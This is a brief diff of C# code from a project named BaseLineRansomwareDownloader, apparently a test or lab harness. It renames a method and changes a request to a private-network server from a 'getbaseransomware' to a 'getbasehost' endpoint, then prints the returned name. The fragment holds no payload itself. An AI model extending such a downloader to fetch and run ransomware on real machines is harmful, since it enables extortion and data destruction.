@@ -17,10 +17,10 @@ namespace BaseLineRansomwareDownloader
         private static readonly HttpClient client = new HttpClient();
 
         //Gets name of next ransomware
-        public static void getBaseRansomware()
+        public static void getBaseHost()
         {
 
-            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/getbaseransomware").Result;
+            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/getbasehost").Result;
             NAMEONTEST = findNAMEONTEST(responseString);
             Console.WriteLine(NAMEONTEST);
 
